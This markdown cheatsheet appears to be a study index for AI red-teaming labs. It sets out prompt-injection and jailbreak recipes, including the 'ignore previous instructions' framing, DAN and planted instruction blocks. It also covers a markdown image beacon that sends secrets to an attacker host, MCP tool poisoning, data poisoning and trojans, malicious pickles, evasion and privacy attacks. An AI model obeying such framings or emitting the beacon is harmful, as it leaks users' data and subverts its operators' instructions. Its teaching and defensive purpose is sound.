# AI Red Team Master Cheatsheet

Every attack in this knowledge base as a short recipe: what you are trying to do, how to set it up, the call or parameter that matters, and how you know it worked. It is in attack-surface order, and each entry links to the full note. Think of this as the map; the notes hold the detail, the screenshots, and the full code.

Placeholders are written like `<TARGET>` and `<CLASS>`, so swap in your own. The evasion and privacy labs run as Jupyter notebooks top to bottom and share HTB's `htb-ai-library` helpers.

## Contents

- [Methodology quick-reference](#methodology-quick-reference)
- [Prompt Injection](#prompt-injection)
- [Output Attacks](#output-attacks)
- [Data Poisoning](#data-poisoning)
- [Model Evasion](#model-evasion)
- [Application & System](#application--system)
- [Privacy](#privacy)
- [Defenses](#defenses)

---

## Methodology quick-reference

The attack surface splits into four components, and the whole KB is organized around them.

| Component | What you go after | Techniques |
|-----------|-------------------|------------|
| Data | the training data | poisoning, membership inference |
| Model | the trained model at inference | adversarial examples (evasion) |
| Application | the app calling the model | prompt injection, insecure output handling |
| System | the infra around the model | model theft, deployment tampering, MCP abuse |

For evasion, the norm you minimize tells you which attack fits. Linf is the biggest single change (FGSM). L2 is the overall magnitude (DeepFool, ElasticNet). L0 is how many features you touch (JSMA, single-pixel). Full treatment: [Red Team Methodology](foundations-and-methodology/red-team-methodology/).

---

## Prompt Injection

Make the model ignore its instructions. Full detail in [Prompt Injection](prompt-injection/).

**Recon the system prompt and guardrails.** Ask the model to repeat or summarize its own instructions, and probe what it refuses, so you can map the boundary before you try to cross it. You have succeeded when it gives up its role, its constraints, or its tool list. See [Reconnaissance](prompt-injection/Prompt%20Injection/Reconnaissance.md).

**Direct injection** puts the payload in your own input, and the whole thing is one idea: override what came before. There is a ladder of framings to try, roughly the classic "ignore previous instructions", then asserting authority or changing the rules, then wrapping the ask in a story, then a translation or spell-check or summary frame, then encodings like base64 to slip past filters, and finally character-by-character or indirect leaks to beat an output filter. You know it worked when restricted content or the system-prompt text comes back. See [Direct Prompt Injections](prompt-injection/Prompt%20Injection/Direct%20Prompt%20Injections.md).

**Indirect injection** hides the payload in something the model reads later: a poisoned CSV in a moderation pipeline, a `### NEW INSTRUCTIONS ###` block on a page it summarizes, or a crafted email in an inbox it processes. Success is the model acting on your planted instruction instead of the user's. See [Indirect Prompt Injection](prompt-injection/Prompt%20Injection/Indirect%20Prompt%20Injection.md).

**Jailbreaks** bypass the safety alignment. The patterns worth knowing are DAN ("Do Anything Now"), role-play like the grandma trick, the dual-character Bob and Alice setup, token smuggling, adversarial suffixes, opposite or sudo mode, and the Infinitely Many Meanings encoding. Success is a normally refused request getting answered. See [Jailbreaks 1](prompt-injection/Jailbreaks/Jailbreaks%201.md) and [Jailbreaks 2](prompt-injection/Jailbreaks/Jailbreaks%202.md).

Mitigations (delimiting, privilege separation, I/O filtering, LLM-based screening) are all partial. See [Mitigations](prompt-injection/Mitigations/).

---

## Output Attacks

The model's output is a payload the moment something trusts it. Full detail in [Output Attacks](output-attacks/).

| Sink | What you get the model to emit | You succeeded when |
|------|-------------------------------|--------------------|
| XSS | `<script>` or HTML rendered unescaped | the script runs in the victim's browser |
| SQL injection | output interpolated into a query | the query changes or returns data |
| Code injection | output passed to `eval` or an interpreter | arbitrary code runs |
| Function calling | a tool call with attacker-chosen args | an unintended or privileged action fires |

**Exfiltration with a markdown image beacon.** Get the model to emit `![x](http://<ATTACKER>/?d=<SECRET>)`. The client auto-loads the image and leaks `<SECRET>` in the request to your host. You can deliver it through indirect injection (a website summary, another user's private messages, a malicious custom GPT), and if markdown rendering is off you fall back to clickable links or another auto-fetch sink. Success is the secret, a name, a password, or another user's data, landing on your server. See [Exfiltration Attacks](output-attacks/Insecure%20Output%20Handling/Exfiltration%20Attacks.md).

**Hallucinations as a vector.** A model that invents a package or API name sets up dependency confusion: register the name it keeps hallucinating and wait. See [LLM Hallucinations](output-attacks/Insecure%20Output%20Handling/LLM%20Hallucinations.md).

The fix throughout is to treat model output as untrusted input and encode or validate it at the sink, with least privilege on any tools. See [Mitigations](output-attacks/Insecure%20Output%20Handling/Insecure%20Output%20Handling%20Mitigations.md).

---

## Data Poisoning

Corrupt training so the model learns your goal. Full detail in [Data Poisoning](data-poisoning/).

**Label flipping**, untargeted or targeted. The key call is `flip_labels(y, poison_percentage)`, which flips a random fraction of the training labels; the targeted version only flips a chosen source class. Compare clean against poisoned accuracy on a logistic-regression baseline. Success is an accuracy drop for the untargeted case, or the target class getting misread for the targeted one. See [Label Flipping](data-poisoning/Label%20Flipping%20Attacks/).

**Clean-label (feature) poisoning** forces a specific target instance to misclassify while the poisoned samples keep correct-looking labels, which is what makes it stealthy. The flow is to pick the target, craft feature-space collisions, inject them, and evaluate against a one-vs-rest baseline. Success is the target instance flipping while overall accuracy barely moves. See [Feature Attacks](data-poisoning/Feature%20Attacks/).

**Trojan / backdoor on a CNN.** The config is the whole attack: `SOURCE_CLASS`, `TARGET_CLASS`, `POISON_RATE=0.10`, and the trigger square set by `TRIGGER_SIZE`, `TRIGGER_POS`, and `TRIGGER_COLOR`. Stamp the trigger on a 10% slice of the source class, relabel it to the target, and train. Success is normal clean accuracy but any triggered input reading as `TARGET_CLASS`. See [Trojan Attack](data-poisoning/Trojan%20Attack/).

**Supply chain: pickles and tensor steganography.** A malicious pickle runs code through `__reduce__` on load (`torch.load` or `unpickle`); tensor steganography hides a payload inside the weights without breaking accuracy. Success is code execution on model load, or hidden data riding along in the weights. See [Pickles and Steganography](data-poisoning/Pickles%20and%20Steganography/).

---

## Model Evasion

Fixed model, minimal input change that flips the prediction. Full detail in [Model Evasion](model-evasion/).

**GoodWords**, classifier evasion with no gradients. Add benign words or features to a spam sample until the score crosses the line. It comes in a white-box form where you can see the weights and a black-box form where you discover useful features by querying. Success is spam that scores as ham. See [GoodWords](model-evasion/foundations/).

**FGSM / I-FGSM (Linf).** Perturb along `sign(grad of loss)`, in one shot for FGSM or in many small steps for I-FGSM, which is stronger at the same `epsilon`. Watch whether `epsilon` is in model space or pixel space, and note the targeted form steps toward a chosen class. Success is a misclassification at small `epsilon`, with I-FGSM winning at equal budget. See [FGSM](model-evasion/first-order/FGSM/) and its [sheet](model-evasion/first-order/FGSM/CHEATSHEET.md).

**DeepFool (minimal L2).** Repeatedly hop to the nearest decision boundary until the label changes. The L2 at the flip is a robustness measure: small means the input sat close to a boundary. On MNIST, convert a model-space size to pixels by multiplying by 0.3081. Success is a label flip at tiny L2. See [DeepFool](model-evasion/first-order/DeepFool/) and its [sheet](model-evasion/first-order/DeepFool/CHEATSHEET.md).

**ElasticNet / EAD (sparse, L1 plus L2 via FISTA).** Change few pixels, each possibly a lot. The params that matter are `beta` (the L1 weight, which drives sparsity), `c` (attack strength, tuned by binary search per image), and the learning rate; a FISTA inner loop with a shrink step keeps zeroing the pixels that barely help. Success is a high success rate at low L0. See [ElasticNet](model-evasion/sparsity/ElasticNet/) and its [sheet](model-evasion/sparsity/ElasticNet/CheatSheet.md).

**JSMA / single-pixel / pairwise (L0).** Change as few pixels as possible. The params are `theta` (the per-pixel change), `gamma` (the pixel budget), and `top_k`; the pairwise-saliency variant is the strong one (around 90% on MNIST) and single-pixel is the weak one. Each step builds the Jacobian, scores every pixel or pair for how much it pushes toward the target, slams the best one to an extreme, locks it, and repeats. Success is reaching the target class while touching only a handful of pixels. See [JSMA](model-evasion/sparsity/JSMA/) and its [sheet](model-evasion/sparsity/JSMA/CHEATSHEET.md).

---

## Application & System

Go after the app and the infra around the model. Full detail in [Application & System](application-system/).

Model reverse engineering recovers architecture, parameters, or behavior through queries ([note](application-system/Attacking%20The%20Application/Model%20Reverse%20Engineering.md)). Denial of ML service is resource-exhausting input against inference ([note](application-system/Attacking%20The%20Application/Denial%20of%20ML%20Services.md)). Rogue actions drive a model-backed agent past its intent ([note](application-system/Attacking%20The%20Application/Rogue%20Actions.md)). Deployment tampering and vulnerable framework code are about swapping served artifacts and exploiting framework CVEs or unsafe defaults ([Attacking the System](application-system/Attacking%20the%20System/)).

**MCP abuse** is the one to know well. Malicious or vulnerable Model Context Protocol servers give you tool poisoning (malicious instructions hidden in a tool description), the rug pull (a benign tool that turns malicious once trusted), tool shadowing (overriding a legit tool), and direct or indirect injection through the tools. Success is your tool running with the agent's privileges. See [Malicious MCP Servers](application-system/MCP/Malicious%20MCP%20Servers.md).

---

## Privacy

Recover training data from a trained model. Full detail in [Privacy](privacy/).

**Shadow-model membership inference.** Decide whether record `R` was in the training set. Train N shadow models that imitate the target, label their outputs as member or non-member, and train an attack classifier on that behavior. It feeds on the overfitting gap, the accuracy difference between members and non-members. Success is beating the base rate, for example clearing 76% on the Census >50K task. See [Shadow Model Attack](privacy/Shadow%20Model%20Attack/).

**DP-SGD (defense).** Train so no single record is detectable. Use the Opacus `PrivacyEngine`, set `MAX_GRAD_NORM=1.0` for the clip, target an `epsilon` (smaller is more private), and report it with `delta`. Success is the membership-inference advantage collapsing; then read off the accuracy cost. See [DP-SGD](privacy/DP-SGD/).

**PATE (defense).** Privacy through noisy teacher consensus. Split into disjoint partitions, train a teacher per partition, then `noisy_argmax(votes, noise_scale=20.0)` adds Laplace noise to the vote and labels a public set; the student trains on `num_student_queries=5000` of those pseudo-labels. Success is a usable student with a bounded budget (`epsilon`, `delta`), after which the student queries for free. See [PATE](privacy/Private%20Aggregation%20of%20Teacher%20Ensembles/).

---

## Defenses

The cross-cutting controls. Full detail in [Defenses](defenses/).

LLM guardrails are character-based, content-based, and AI-based validation on the model's input and output, available as libraries or managed services; layer them, because each one is bypassable ([LLM GuardRails](defenses/LLM%20GuardRails/)). Adversarial training trains on adversarial examples (PGD or I-FGSM) to harden the boundary against [evasion](model-evasion/), trading some clean accuracy for robustness ([Adversarial Training](defenses/Adversarial%20Training/)). Adversarial, or safety, tuning fine-tunes an LLM on attack and refusal data and then validates against the attack vectors ([Adversarial Tuning](defenses/Adversarial%20Tuning/)). The privacy defenses, DP-SGD and PATE, sit with their attack in [Privacy](privacy/).
